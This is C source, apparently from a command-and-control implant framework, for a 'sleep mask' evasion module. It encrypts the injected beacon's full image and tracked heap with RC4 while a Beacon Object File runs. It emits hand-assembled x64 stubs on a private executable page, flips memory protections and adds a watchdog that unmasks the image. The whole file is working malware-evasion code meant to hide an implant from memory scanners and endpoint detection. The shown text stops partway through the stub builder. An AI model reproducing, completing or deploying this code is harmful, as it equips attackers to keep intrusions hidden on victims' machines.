/* Phase 3 BOF-window masking (see docs/EVASION-ROADMAP.md section 13.11).
 *
 * Masks the FULL beacon image - .text included - plus every tracked heap
 * block for the duration of a BOF that imports NO beacon APIs (boff.cpp
 * gates on the import analysis). The admission rule is what makes .text
 * maskable at all: with zero ftable relocations the BOF can never execute
 * beacon code during its run, so nothing needs the image in plaintext -
 * the same class of guarantee the gen3 sleep window has, applied to an
 * arbitrary Win32-only workload.
 *
 * The transitions are the hard part (an in-place RC4 of .text destroys the
 * running engine - the round-14 lesson that keeps .text out of the gen3
 * sleep mask). Solution: three hand-assembled stubs on a private RX page
 * (gate-stub technique) bracket the window:
 *
 *   C: mask every non-.text block (plain RC4 loops, still in .text)
 *   call enter_stub:                       [entered rsp%16==8]
 *       sub rsp,8 / push exit_stub / sub rsp,0x28   -> BOF ret lands on
 *                                                      exit_stub, rsp%16==8
 *       sf032(u_text, u_key)               <- masks .text (the LAST block)
 *                                              while executing the page
 *       rcx=args, rdx=alen, jmp entry
 *   [BOF runs: whole image + tracked heap ciphertext, Win32 calls only]
 *   BOF ret -> exit_stub:                  [entered rsp%16==0]
 *       xchg state 1->2 (watchdog race guard); winner: sf032(.text) back
 *       ret                                <- pops the C caller's return
 *   C: unmask the remaining blocks, kill the watchdog, wipe the ctx
 *
 * The pushed exit_stub makes the stack self-consistent - no frame surgery:
 * the C caller resumes exactly as if enter_stub had returned normally.
 *
 * Watchdog: if the BOF never returns, a one-shot timer fires watchdog_stub
 * (page code): xchg-winner restores .text, tail-jumps bw_watchdog_rest
 * (plain C, .text plaintext again) which restores the rest. The beacon
 * degrades to unmasked with the BOF still running - never stuck masked.
 *
 * Alignment cheatsheet (why the paddings differ): enter/exit/watchdog are
 * entered with rsp%16 of 8 / 0 / 8 respectively; each sf032 call site pads
 * to rsp%16==0 right before its call. Verified by capstone disassembly of
 * the built page (evasion-lab/verify_bofwin_stub.py).
 *
 * x64 only. x86 compiles to permanent FALSE (caller runs the BOF unmasked). */
#include <windows.h>
#include <string.h>
#include <stddef.h>
#include "sleepmask_bofwin.h"
#include "sleepmask_gen3.h"

#if defined(BW_TRACE_ENABLE)
#include <stdio.h>
#define BW_TRACE(msg) fprintf(stderr, "[bw] %s\n", msg)
#define BW_TRACE2(msg, a, b, c) fprintf(stderr, "[bw] %s p=%p len=%lu idx=%d\n", msg, (void *)(a), (unsigned long)(b), (int)(c))
#else
#define BW_TRACE(msg) ((void)0)
#define BW_TRACE2(msg, a, b, c) ((void)0)
#endif
#include "gargleint.h"
#include "track_memory.h"
#include "crypto.h"

#if defined(_M_X64)

typedef struct {
	unsigned char * ptr;
	unsigned long   len;
	DWORD           orig_prot; /* restored after the unmask - .text is RX in
	                            * the injected image and RC4 needs RW */
} BW_BLOCK;

#define BW_MAX_BLOCKS 128

typedef struct {
	unsigned long   Length;          /* USTRING is ANSI_STRING-shaped:     */
	unsigned long   MaximumLength;   /* {len, max, buf} - the first cut    */
	unsigned char * Buffer;          /* shipped {buf,len,max} and sf032    */
} BW_USTRING;                        /* dereferenced the length as a ptr   */

#ifndef NTSTATUS
#define NTSTATUS LONG
#endif
typedef NTSTATUS(NTAPI *BW_SF032)(BW_USTRING * data, BW_USTRING * key);

/* ctx page - FIXED OFFSETS addressed by the hand-asm stubs. Any field move
 * must update the stub builders below. */
typedef struct {
	volatile LONG   state;                /* +0x00: 0 idle / 1 open / 2 closed */
	volatile LONG   rest_done;            /* +0x04: rest-unmask claim flag    */
	unsigned char   key[16];              /* +0x08                            */
	BW_SF032        sf032;                /* +0x18 SystemFunction032          */
	void          (*entry)(void *, int);  /* +0x20 BOF entry                  */
	void          * args;                 /* +0x28                            */
	int             alen;                 /* +0x30                            */
	int             pad0;                 /* +0x34 align pad (explicit)       */
	BW_BLOCK      * blocks;               /* +0x38 -> ctx->storage            */
	int             nblocks;              /* +0x40                            */
	int             text_idx;             /* +0x44 .text block index          */
	int             pad1;                 /* +0x48 layout pad: WITHOUT these  */
	int             pad2;                 /* +0x4C two words u_text lands at  */
	                                     /* +0x48 and every stub offset from */
	BW_USTRING      u_text;               /* +0x50 here down is off by 8 (the */
	                                     /* round-4/5 root cause)            */
	BW_USTRING      u_key;                /* +0x60  (Buffer -> ctx->key)      */
	unsigned long   vp_old;               /* +0x70 VirtualProtect old-prov bin */
	unsigned long   text_prot;            /* +0x74 .text original protection  */
	unsigned char   key2[16];             /* +0x78 ctr-variant work buffer: bw_rc4
	                                       * must not carry a stack array, or /GS
	                                       * reads the ciphertext cookie on the
	                                       * .data-unmask call and fail-fasts in
	                                       * the epilogue (bypasses every VEH) */
	BOOL (WINAPI  * pVirtualProtect)(void *, SIZE_T, DWORD, DWORD *); /* +0x88 */
	BOOL (WINAPI  * pFlushIC)(void *, const void *, SIZE_T);          /* +0x90 */
	volatile LONG   phase;                /* +0x98 crash forensics: 1=enter VP
	                                       * done 2=mask loop done 3=exit won
	                                       * 4=back in C 5=wd_rest 6=prots done
	                                       * 7=timer gone 8=wiped 10+i=C mask
	                                       * block i 40+i=C restore block i
	                                       * 60+i=watchdog restore block i    */
	int             pad3;                 /* +0x9C -> storage at +0xA0        */
	unsigned char   storage[BW_MAX_BLOCKS * sizeof(BW_BLOCK)];      /* +0xA0 */
	unsigned char   sbox0[256];           /* KSA(key,ctr=text_idx) - pristine;
	                                       * the stub-side PRGA mutates sbox1,
	                                       * so exit/watchdog rep-movsq the
	                                       * fresh state back before unmasking */
	unsigned char   sbox1[256];           /* PRGA working copy                */
} BW_CTX;

/* the hand-asm stubs address BW_CTX by HARDCODED offsets - the round-4/5
 * crashes were both this struct silently landing 8 bytes below them. These
 * asserts make any future drift a COMPILE error instead of a live dump. */
typedef char bw_assert_u_text[offsetof(BW_CTX, u_text) == 0x50 ? 1 : -1];
typedef char bw_assert_vp_old[offsetof(BW_CTX, vp_old) == 0x70 ? 1 : -1];
typedef char bw_assert_key2[offsetof(BW_CTX, key2) == 0x78 ? 1 : -1];
typedef char bw_assert_pvp[offsetof(BW_CTX, pVirtualProtect) == 0x88 ? 1 : -1];
typedef char bw_assert_pflush[offsetof(BW_CTX, pFlushIC) == 0x90 ? 1 : -1];
typedef char bw_assert_phase[offsetof(BW_CTX, phase) == 0x98 ? 1 : -1];
typedef char bw_assert_storage[offsetof(BW_CTX, storage) == 0xA0 ? 1 : -1];
typedef char bw_assert_sbox0[offsetof(BW_CTX, sbox0) == 0x8A0 ? 1 : -1];
typedef char bw_assert_sbox1[offsetof(BW_CTX, sbox1) == 0x9A0 ? 1 : -1];

volatile long g_bw_watchdog_fires;  /* test hook: watchdog rest-path count */

static unsigned char * g_bw_stubs;   /* private RX page: enter/exit/watchdog */
static BW_CTX        * g_bw_ctx;     /* private RW page, never tracked/masked */

#define BW_STATE_IDLE   0
#define BW_STATE_OPEN   1
#define BW_STATE_CLOSED 2

#define BW_ENTER_OFF 0x000
#define BW_EXIT_OFF  0x080
#define BW_WATCH_OFF 0x110
#define BW_CTXQ_OFF  0x1B0   /* qword: ctx page address (rip-relative for stubs) */
#define BW_SB0Q_OFF  0x1B8   /* qword: ctx->sbox0 address */
#define BW_SB1Q_OFF  0x1C0   /* qword: ctx->sbox1 address */
#define BW_RC4_OFF   0x1C8   /* page-local RC4 PRGA (see below) */

/* RC4-with-counter, byte-for-byte the gen3 scheme (sleepmask_gen3.cpp):
 * round-tripping a block under a DIFFERENT counter would corrupt it. */
/* GS-free by construction: the ctr-variant key bytes land in the private
 * ctx page (work), never in a stack array. A stack array gives this frame
 * a /GS cookie - and the .data-unmask call would read the ciphertext cookie
 * in its prologue and the restored one in its epilogue (mismatch = fail-fast
 * that bypasses every VEH, the host-test killer). */
static void bw_rc4(BW_SF032 fn, unsigned char * buf, unsigned long len,
                   unsigned char * work, const unsigned char * key, unsigned int ctr)
{
	BW_USTRING d, kk;
	int j;

	for (j = 0; j < 16; j++)
		work[j] = key[j];
	work[0] ^= (unsigned char)ctr;
	work[1] ^= (unsigned char)(ctr >> 8);
	kk.Buffer = work;
	kk.Length = kk.MaximumLength = 16;
	d.Buffer = buf;
	d.Length = d.MaximumLength = len;
	fn(&d, &kk);
	work[0] = 0;
	work[1] = 0;
}

/* KSA for the stub-side PRGA: identical stream to bw_rc4(key, ctr) - the
 * ctr-variant bytes are xored in here so the page code only walks the
 * permutation. Runs at window setup, plaintext image, so a plain stack
 * array (and its /GS cookie) is fine here - unlike bw_rc4. */
static void bw_kasa(unsigned char * sbox, const unsigned char * key, unsigned int ctr)
{
	unsigned char k2[16];
	unsigned char t;
	int i, j = 0;

	memcpy(k2, key, 16);
	k2[0] ^= (unsigned char)ctr;
	k2[1] ^= (unsigned char)(ctr >> 8);
	for (i = 0; i < 256; i++)
		sbox[i] = (unsigned char)i;
	for (i = 0; i < 256; i++) {
		j = (j + sbox[i] + k2[i & 15]) & 255;
		t = sbox[i];
		sbox[i] = sbox[j];
		sbox[j] = t;
	}
	memset(k2, 0, 16);
}

/* section protection with guard/noaccess rejection. The original
 * protection is returned through *prot for the post-unmask restore: .text
 * is RX in the injected image and the RC4 pass needs RW, so the window
 * flips pages and puts them back (the arsenal-kit sleepmasks do the same
 * around their encryption). */
static BOOL bw_page_usable(void * p, DWORD * prot)
{
	MEMORY_BASIC_INFORMATION mbi;

	if (p == NULL || prot == NULL)
		return FALSE;
	if (!VirtualQuery(p, &mbi, sizeof(mbi)))
		return FALSE;
	if (mbi.State != MEM_COMMIT)
		return FALSE;
	if (mbi.Protect & PAGE_GUARD)
		return FALSE;
	if (mbi.Protect == PAGE_NOACCESS)
		return FALSE;
	*prot = mbi.Protect;
	return TRUE;
}

/* restore the recorded protections via the CAPTURED VirtualProtect - the
 * IAT lives in .rdata, which is on the mask list roadmap, so teardown must
 * not depend on it; plain C - only ever called from the window teardown,
 * after the exit stub put .text back */
static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx,
                              BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *))
{
	int i;
	DWORD old = 0;

	for (i = 0; i < n; i++) {
		if (i == text_idx)
			continue;
		pVP(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
	}
}

	/* After the mask loop, .data/.rdata (and the IAT) are ciphertext. MSVC /O1
	 * turned `enter = g_bw_stubs + OFF; enter();` into `call [g_bw_stubs]`
	 * which reloads the global from .data AFTER the mask (live dump: RIP in
	 * bofwin_window at the call, read of 0xffffffffffffffff). This trampoline
	 * is a separate unoptimized function so the pointer arrives in rcx and
	 * is called directly - no .data reload. */
#if defined(_MSC_VER)
#pragma optimize("", off)
#endif
	static void bw_call_enter(void (*fn)(void))
	{
		fn();
	}

	/* same class of guard: a local pDelTimer = DeleteTimerQueueTimer gets
	 * const-folded by /O1 into call [__imp_DeleteTimerQueueTimer] - fatal
	 * on the mask-fail path where .rdata is already ciphertext */
	static void bw_call_deltimer(BOOL (WINAPI *fn)(void *, void *, void *),
	                             void * a, void * b, void * c)
	{
		fn(a, b, c);
	}
#if defined(_MSC_VER)
#pragma optimize("", on)
#endif

/* Snapshot the whole image (header page + every section except the
 * unwind/reloc tables) plus tracked heap records outside the image. The
 * .text block is appended LAST and reported via *text_idx - the enter stub
 * masks it separately and the exit stub restores it first.
 * Read-only non-.text sections (.rdata, where the strings/config/IAT
 * live) join the list too: the stubs are API-free and the teardown runs
 * on captured pointers, so the IAT can be ciphertext for the window. */
static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
{
	DWORD text_span[2];
	int n, t, i;

	/* the g3 engine already walks our own PE (header page, writable
	 * non-.text sections, tracked heap with the in-image dedup rules) -
	 * reuse it instead of a second parser */
	(void)image;
	n = g3_snapshot_for_bofwin((G3_HEADER_BLOCK *)out, max, text_span);
	if (n <= 0)
		return 0;
	if (text_span[0] == 0 || text_span[1] <= text_span[0])
		return 0;

	/* the accessor's blocks carry no protection (the gen3 type has no
	 * prot field). orig_prot 0 makes the teardown's restore-VP a silent
	 * no-op - harmless while every block was RW, wrong once read-only
	 * sections join: capture the TRUE protection of each block now,
	 * before anything is flipped */
	for (i = 0; i < n; i++) {
		if (out[i].orig_prot == 0)
			(void)bw_page_usable(out[i].ptr, &out[i].orig_prot);
	}

	/* append every READ-ONLY committed section outside .text (.rdata,
	 * .pdata, .rsrc...): the window contract (no API between phase 2 and
	 * the exit stub, stub-side PRGA, captured pVP/pDelTimer) covers them */
	{
		unsigned char * pe = (unsigned char *)gparms->beacon_ptr;
		DWORD lfanew = *(DWORD *)(pe + 0x3C);
		WORD nsec = *(WORD *)(pe + lfanew + 6);
		WORD optsz = *(WORD *)(pe + lfanew + 20);
		DWORD secoff = lfanew + 24 + optsz;
		WORD s;
		for (s = 0; s < nsec && n + 1 < max; s++) {
			unsigned char * so = pe + secoff + (DWORD)s * 40;
			DWORD vsz = *(DWORD *)(so + 8);
			DWORD va = *(DWORD *)(so + 12);
			DWORD rsz = *(DWORD *)(so + 16);
			DWORD end = va + (vsz ? vsz : rsz);
			unsigned char * psec;
			DWORD prot = 0;
			int covered = 0;
			if (va == 0 || end <= va)
				continue;
			if (va < text_span[1] && end > text_span[0])
				continue; /* .text: the stub path owns it */
			psec = pe + va;
			if (!bw_page_usable(psec, &prot))
				continue;
			if (prot & (PAGE_READWRITE | PAGE_WRITECOPY |
			            PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
				continue; /* writable: the accessor list already has it */
			for (i = 0; i < n; i++) {
				if (out[i].ptr < psec + (end - va) && out[i].ptr + out[i].len > psec) {
					covered = 1;
					break;
				}
			}
			if (covered)
				continue;
			out[n].ptr = psec;
			out[n].len = end - va;
			out[n].orig_prot = prot;
			n++;
		}
	}

	/* append .text (single committed region clamp, same as g3 keeps for
	 * its own exclusions); the enter stub masks it LAST via ctx->u_text */
	t = n;
	if (t < max && bw_page_usable((unsigned char *)gparms->beacon_ptr + text_span[0],
	                              &out[t].orig_prot)) {
		out[t].ptr = (unsigned char *)gparms->beacon_ptr + text_span[0];
		out[t].len = text_span[1] - text_span[0];
		*text_idx = t;
		n++;
	}
	if (*text_idx < 0)
		return 0;
	return n;
}

/* ---- hand-assembled transition stubs (gate-stub technique) ----
 *
 * Page layout (byte offsets; ctx/sbox qwords and the watchdog tail-jump
 * target are patched at build time):
 *   0x000 enter_stub   (cap 0x80)
 *   0x080 exit_stub    (cap 0x90)
 *   0x110 watchdog_stub(cap 0xA0)
 *   0x1B0 qword: ctx page address (rip-relative source for all three)
 *   0x1B8 qword: ctx->sbox0 address
 *   0x1C0 qword: ctx->sbox1 address
 *   0x1C8 rc4_prga: page-local RC4 PRGA
 *
 * The stubs NEVER call SystemFunction032. Crash round 4 (live dump 952):
 * enter's sf032(u_text, u_key) - the first stub-side CNG call, ~0x29000
 * bytes of .text - died inside cryptsp->bcrypt->bcryptPrimitives with the
 * key-import memcpy reading a garbage source (0x2000000000) passed down
 * from the CNG stack frames. The same sf032 works fine for the small
 * blocks from the C loop, so the CNG machinery is only reliable on the
 * plain-C call shape. The page carries its own PRGA instead:
 *
 *   C setup: bw_kasa(ctx->sbox0, key, text_idx); memcpy(sbox1, sbox0)
 *   enter:   VP(.text->RW); rc4_prga(.text)  <- masks (mutates sbox1)
 *   exit:    rep movsq sbox1<-sbox0; rc4_prga(.text)  <- same stream, unmask
 *   watch:   same as exit, then tail-jump the C rest-unmask
 *
 * rc4_prga (rcx=data, edx=len32; clobbers rax, r8-r11 only - no
 * callee-saved regs, no stack, no calls, no alignment contract):
 *   mov r10,[rip+sbox1q]; xor r8d,r8d; xor r9d,r9d        i=j=0
 * L: test edx,edx; jz done
 *   inc r8b                                                i=(i+1)&255
 *   movzx r11d, byte [r10+r8]                              Si
 *   add r9b, r11b                                          j=(j+Si)&255
 *   movzx eax, byte [r10+r9]                               Sj
 *   mov [r10+r8], al; mov [r10+r9], r11b                   swap
 *   add al, r11b                                           t=(Si+Sj)&255
 *   movzx eax, byte [r10+rax]                              K
 *   xor [rcx], al; inc rcx; dec edx; jmp L
 * done: ret
 *
 * The byte-register arithmetic (inc r8b / add r9b / add al) keeps every
 * index <=255 by construction - and r8/r9/rax stay zero-extended because
 * they were xor'd once and never written above the low byte.
 *
 * enter (called from C, rsp%16==8, [rsp]=ret_to_C):
 *   sub rsp,0x28 / VP(.text->RW) / phase=1 / rc4_prga(.text)
 *   mov r11,exit / push r11 (BOF rsp ==8 mod 16, [rsp]=exit)
 *   rcx=args / edx=alen / jmp [ctx->entry]
 *
 * exit (BOF ret lands here, rsp==0 mod 16, ret_to_C at [rsp+0x28]):
 *   xchg-claim; loser jumps to tail. winner: sub rsp,0x20 / rep movsq
 *   sbox1<-sbox0 / rc4_prga(.text) / VP(.text->text_prot) / FlushIC /
 *   add rsp,0x20. tail: add rsp,0x28 / ret (pops ret_to_C)
 *
 * watchdog (timer callback, rsp%16==8): same claim; winner: sub rsp,0x28
 *   (kept for the VP/flush calls later); sbox refresh; rc4_prga; VP; flush;
 *   add rsp,0x28; tail-jmp bw_watchdog_rest (ret addr intact)
 */
static unsigned char * bw_put32(unsigned char * p, long v)
{
	memcpy(p, &v, 4);
	return p + 4;
}

static unsigned char * bw_put64(unsigned char * p, unsigned long long v)
{
	memcpy(p, &v, 8);
	return p + 8;
}

/* disp32 so a rip-relative instruction ending at page offset next targets
 * the qword at page offset target */
static long bw_disp(int next, int target)
{
	return (long)target - (long)next;
}

static BW_SF032 bw_sf032_resolve(void)
{
	HMODULE adv = GetModuleHandleA("advapi32.dll");

	if (adv == NULL)
		adv = LoadLibraryA("advapi32.dll");
	if (adv == NULL)
		return NULL;
	return (BW_SF032)GetProcAddress(adv, "SystemFunction032");
}

/* the watchdog tail-jump target: restores the non-.text blocks from plain
 * C. Reached only after the winning xchg already restored .text, so this
 * runs with .text plaintext even while the BOF is still going. Returns to
 * the timer dispatcher (the stub tail-jumped with its return address). */
static void __stdcall bw_watchdog_rest(BW_CTX * ctx)
{
	int i;

	if (ctx == NULL || InterlockedExchange(&ctx->rest_done, 1) != 0)
		return; /* the post-exit C path (or a prior watchdog) did it */
	ctx->phase = 5;
	InterlockedIncrement(&g_bw_watchdog_fires);
	for (i = 0; i < ctx->nblocks; i++) {
		if (i == ctx->text_idx)
			continue;
		ctx->phase = 60 + i;
		bw_rc4(ctx->sf032, ctx->blocks[i].ptr, ctx->blocks[i].len,
		       ctx->key2, ctx->key, (unsigned int)i);
	}
	/* .text protection was restored by the winning stub; the remaining
	 * blocks' protections are restored by the window teardown on the BOF
	 * thread (bw_blocks_restore). The exit_stub sees state==CLOSED and
	 * just rets. */
}

/* page-local RC4 PRGA - emitted verbatim at BW_RC4_OFF. The two rel8s and
 * the rip-relative d32 are layout constants (fixed region offsets), and
 * the mirror (evasion-lab/verify_bofwin_stub.py) byte-compares + emulates
 * this stream against a reference RC4. */
static const unsigned char BW_RC4_CODE[0x3B] = {
	0x4C, 0x8B, 0x15, 0xF1, 0xFF, 0xFF, 0xFF,   /* +0x00 mov r10,[rip-0xF] -> sbox1q (4C: REX.R, 48 would load RDX) */
	0x45, 0x31, 0xC0,                           /* +0x07 xor r8d,r8d   i=0 */
	0x45, 0x31, 0xC9,                           /* +0x0A xor r9d,r9d   j=0 */
	0x85, 0xD2,                                 /* +0x0D L: test edx,edx */
	0x74, 0x29,                                 /* +0x0F jz done (0x3A) */
	0x41, 0xFE, 0xC0,                           /* +0x11 inc r8b */
	0x47, 0x0F, 0xB6, 0x1C, 0x02,               /* +0x14 movzx r11d,[r10+r8] */
	0x45, 0x00, 0xD9,                           /* +0x19 add r9b,r11b */
	0x43, 0x0F, 0xB6, 0x04, 0x0A,               /* +0x1C movzx eax,[r10+r9] */
	0x43, 0x88, 0x04, 0x02,                     /* +0x21 mov [r10+r8],al */
	0x47, 0x88, 0x1C, 0x0A,                     /* +0x25 mov [r10+r9],r11b */
	0x44, 0x00, 0xD8,                           /* +0x29 add al,r11b */
	0x41, 0x0F, 0xB6, 0x04, 0x02,               /* +0x2C movzx eax,[r10+rax] */
	0x30, 0x01,                                 /* +0x31 xor [rcx],al */
	0x48, 0xFF, 0xC1,                           /* +0x33 inc rcx */
	0xFF, 0xCA,                                 /* +0x36 dec edx */
	0xEB, 0xD3,                                 /* +0x38 jmp L (0x0D) */
	0xC3,                                       /* +0x3A done: ret */
};

/* sbox1 <- sbox0: push rsi/rdi (callee-saved, rep movsq clobbers them),
 * load both qwords rip-relatively, 0x40 qwords, pop. 26 bytes; the two
 * d32s are computed by the caller: rel = qword_off - (R+9) / (R+16). */
static int bw_emit_refresh(unsigned char * e, long d0, long d1)
{
	int n = 0;
	e[n++] = 0x56;                                  /* push rsi */
	e[n++] = 0x57;                                  /* push rdi */
	e[n++] = 0x48; e[n++] = 0x8B; e[n++] = 0x35;    /* mov rsi,[rip+d0] */
	memcpy(e + n, &d0, 4); n += 4;
	e[n++] = 0x48; e[n++] = 0x8B; e[n++] = 0x3D;    /* mov rdi,[rip+d1] */
	memcpy(e + n, &d1, 4); n += 4;
	e[n++] = 0xB9; e[n++] = 0x40; e[n++] = 0x00; e[n++] = 0x00; e[n++] = 0x00; /* mov ecx,0x40 */
	e[n++] = 0xF3; e[n++] = 0x48; e[n++] = 0xA5;    /* rep movsq */
	e[n++] = 0x5F;                                  /* pop rdi */
	e[n++] = 0x5E;                                  /* pop rsi */
	return n;
}

static BOOL bw_build_pages(void)
{
	DWORD old = 0;
	unsigned char * p;
	unsigned char * e;

	if (g_bw_stubs != NULL && g_bw_ctx != NULL)
		return TRUE;

	g_bw_ctx = (BW_CTX *)VirtualAlloc(NULL, sizeof(BW_CTX), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	g_bw_stubs = (unsigned char *)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (g_bw_ctx == NULL || g_bw_stubs == NULL)
		return FALSE;
	memset(g_bw_ctx, 0, sizeof(BW_CTX));
	memset(g_bw_stubs, 0, 0x1000);
	p = g_bw_stubs;
#define BW_BUILD_FAIL() do { 	VirtualFree(g_bw_ctx, 0, MEM_RELEASE);  g_bw_ctx = NULL; 	VirtualFree(g_bw_stubs, 0, MEM_RELEASE); g_bw_stubs = NULL; 	return FALSE; } while (0)

	/* ---- enter_stub (called from C, rsp%16==8, [rsp]=ret_to_C) ----
	 * Stack contract (round-5 rewrite): the BOF must be entered EXACTLY
	 * as a real call would - rsp%16==8, [rsp]=exit, and ret_to_C one slot
	 * ABOVE the BOF's 32-byte shadow so a compiled BOF can never scratch
	 * it. sub 0x28 first (align+shadow for the VP call), all calls, THEN
	 * push exit (nothing after it touches the stack), jmp entry:
	 *   entry rsp=S-8:  sub 0x28 -> S-0x30 (calls happen here)
	 *   push exit       -> S-0x38 == BOF rsp ([rsp]=exit, ==8 mod 16)
	 *   BOF shadow      = [S-0x30..S-0x18]  (inside the sub'd area)
	 *   ret_to_C        = [S-8] = BOF rsp+0x30 (above the shadow)
	 *   BOF ret -> exit at rsp=S-0x30 (==0 mod 16: exit's sub 0x20 aligns
	 *   its VP/flush calls and provides their shadow) */
	{
		e = p + BW_ENTER_OFF;
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x28;            /* sub rsp,0x28 */
		e += 4;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* mov rcx,[rax+0x58] buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* mov edx,[rax+0x50] len32 */
		e += 3;
		e[0] = 0x41; e[1] = 0xB8; e[2] = 0x04; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* mov r8d,PAGE_RW */
		e += 6;
		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* lea r9,[rax+0x70] */
		e += 4;
		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
		e += 6;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* phase=1 (disp32) */
		e[6] = 0x01; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
		e += 10;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = u_text.buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = u_text.len32 */
		e += 3;
		e[0] = 0xE8;                                                     /* call rc4_prga */
		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x49; e[1] = 0xBB;                                        /* mov r11, imm64 exit */
		e = bw_put64(e + 2, (unsigned long long)(p + BW_EXIT_OFF));
		e[0] = 0x41; e[1] = 0x53;                                        /* push r11: BOF's [rsp] */
		e += 2;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x28;            /* rcx = args */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x30;                          /* edx = alen */
		e += 3;
		e[0] = 0xFF; e[1] = 0x60; e[2] = 0x20;                          /* jmp [rax+0x20] entry */
		e += 3;
		if ((int)(e - (p + BW_ENTER_OFF)) > 0x80)
			BW_BUILD_FAIL();
	}

	/* ---- exit_stub (BOF ret lands here at rsp=S-0x30, %16==0) ----
	 * phase=3; xchg-claim; loser jumps to the tail. winner: sub 0x20
	 * (shadow + call alignment), refresh sbox1, rc4_prga unmasks .text,
	 * VP back to text_prot, FlushIC, add 0x20. tail: add rsp,0x28; ret
	 * pops ret_to_C at [S-8] (rsp+0x28 from exit entry). */
	{
		int jne_at, tail_at;
		e = p + BW_EXIT_OFF;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* mov rax,[rip+d32] */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0xC7; e[1] = 0x80; e[2] = 0x98; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* phase=3 */
		e[6] = 0x03; e[7] = 0x00; e[8] = 0x00; e[9] = 0x00;
		e += 10;
		e[0] = 0xB9; e[1] = 0x02; e[2] = 0x00; e[3] = 0x00; e[4] = 0x00; /* mov ecx,2 */
		e += 5;
		e[0] = 0x87; e[1] = 0x08;                                        /* xchg ecx,[rax] */
		e += 2;
		e[0] = 0x83; e[1] = 0xF9; e[2] = 0x01;                          /* cmp ecx,1 */
		e += 3;
		jne_at = (int)(e - p);
		e[0] = 0x0F; e[1] = 0x85;                                        /* jne rel32 tail (patched) */
		e = bw_put32(e + 2, 0);
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xEC; e[3] = 0x20;            /* sub rsp,0x20 */
		e += 4;
		e += bw_emit_refresh(e, bw_disp((int)(e - p) + 9, BW_SB0Q_OFF),
		                        bw_disp((int)(e - p) + 16, BW_SB1Q_OFF));
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
		e += 3;
		e[0] = 0xE8;                                                     /* call rc4_prga */
		e = bw_put32(e + 1, BW_RC4_OFF - (int)(e - p) - 5);
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x48; e[3] = 0x58;            /* rcx = buf */
		e += 4;
		e[0] = 0x8B; e[1] = 0x50; e[2] = 0x50;                          /* edx = len32 */
		e += 3;
		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x80;                          /* r8d = [rax+0x74] orig */
		e = bw_put32(e + 3, 0x74);
		e[0] = 0x4C; e[1] = 0x8D; e[2] = 0x48; e[3] = 0x70;            /* r9 = &vp_old */
		e += 4;
		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x88; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x88] VP */
		e += 6;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x05;                          /* reload ctx */
		e = bw_put32(e + 3, bw_disp((int)(e - p) + 7, BW_CTXQ_OFF));
		e[0] = 0x48; e[1] = 0xC7; e[2] = 0xC1; e[3] = 0xFF; e[4] = 0xFF; e[5] = 0xFF; e[6] = 0xFF; /* rcx=-1 */
		e += 7;
		e[0] = 0x48; e[1] = 0x8B; e[2] = 0x50; e[3] = 0x58;            /* rdx = buf */
		e += 4;
		e[0] = 0x44; e[1] = 0x8B; e[2] = 0x40; e[3] = 0x50;            /* r8d = len32 */
		e += 4;
		e[0] = 0xFF; e[1] = 0x90; e[2] = 0x90; e[3] = 0x00; e[4] = 0x00; e[5] = 0x00; /* call [rax+0x90] flush */
		e += 6;
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x20;            /* add rsp,0x20 */
		e += 4;
		tail_at = (int)(e - p);
		e[0] = 0x48; e[1] = 0x83; e[2] = 0xC4; e[3] = 0x28;            /* tail: add rsp,0x28 */
		e += 4;
		e[0] = 0xC3;                                                     /* ret -> ret_to_C */
		e += 1;
